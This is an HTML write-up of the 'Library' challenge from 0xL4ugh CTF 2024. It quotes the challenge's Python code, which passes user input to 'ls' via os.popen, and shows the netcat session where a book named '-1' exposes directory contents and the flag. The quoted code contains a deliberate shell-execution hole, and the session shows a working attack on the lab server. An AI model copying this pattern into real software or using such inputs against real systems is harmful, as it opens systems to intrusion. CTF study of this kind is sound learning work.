<title>Library - 0xL4ugh CTF 2024 </title>

<!DOCTYPE html>
<html>
 
<body>
    <h1>Library - 0xL4ugh CTF 2024 </h1>

    <h2>Challenge Description</h2>
    <p>Built a book library, however my friend says that i made a nasty mistake!

Author: zAbuQasem

nc 172.190.120.133 50003
 
</p>

    <h2>Solution Approach</h2>
    <p>Here are the steps we took to solve the challenge:</p>
    <ol>
        <li>i download code and see a vounerable code in  challenge.py in this function</li>
<pre>
ef check_file_presence():
    book_name = shlex.quote(console.input("[bold blue]Enter the name of the book (file) to check:[/bold blue] "))
    command = "ls " + book_name

    try:
        result = os.popen(command).read().strip()
        print(result)
        if result == book_name:
            console.print(f"[bold green]The book is present in the current directory.[/bold green]")
        else:
            console.print(f"[bold red]The book is not found in the current directory.[/bold red]")
    except Exception as e:
        console.print(f"[bold red]Error: {e}[/bold red]")</pre>
       </pre>
   this code<pre>book_name = shlex.quote(console.input("[bold blue]Enter the name of the book (file) to check:[/bold blue] "))
    command = "ls " + book_name</pre> will check exist of code with run command ls if have any book so i create book via options 7 and 2  and chaeck file exist with 8
and see flag in list of files after run ls
<pre>
nc 172.190.120.133 50003

Library Management System
1. Add Member
2. Add Book
3. Display Books
4. Search Book
5. Check Out Book
6. Return Book
7. Save Book
8. Check File Presence
0. Exit
Enter your choice (0-8): 7

Book Manager:
1. Save Existing
2. Create new book
Enter your choice (1-2): 2
Enter book title: -1
Enter book author: 1
1Enter book ISBN: 
Enter number of copies: 1
Book saved successfully

Library Management System
1. Add Member
2. Add Book
3. Display Books
4. Search Book
5. Check Out Book
6. Return Book
7. Save Book
8. Check File Presence
0. Exit
Enter your choice (0-8): 8
Enter the name of the book (file) to check: -1
$FLAG
*
-1
0xL4ugh{TrU5t_M3_LiF3_I5_H4rD3r!}
2
<bound method SaveFile.__init__ of <__main__.SaveFile object at 0x7f7b767b5790>>
AAA 0xL4ugh{TrU5t_M3_LiF3_I5_H4rD3r!}
FLAG
challenge.py
echo 'Hello'
echo hello
exec.sh
sex
The book is not found in the current directory.

Library Management System
1. Add Member
2. Add Book
3. Display Books
4. Search Book
5. Check Out Book
6. Return Book
7. Save Book
8. Check File Presence
0. Exit
Enter your choice (0-8): 
</pre>

    
    </ol>
<br>
    <h2>Flag</h2>
    <p class="flag">0xL4ugh{TrU5t_M3_LiF3_I5_H4rD3r!}
</p>

    <h2>Conclusion</h2>
    <p>this is a very   easy chanllenge for command injection in python code</p>
</body>
</html>

 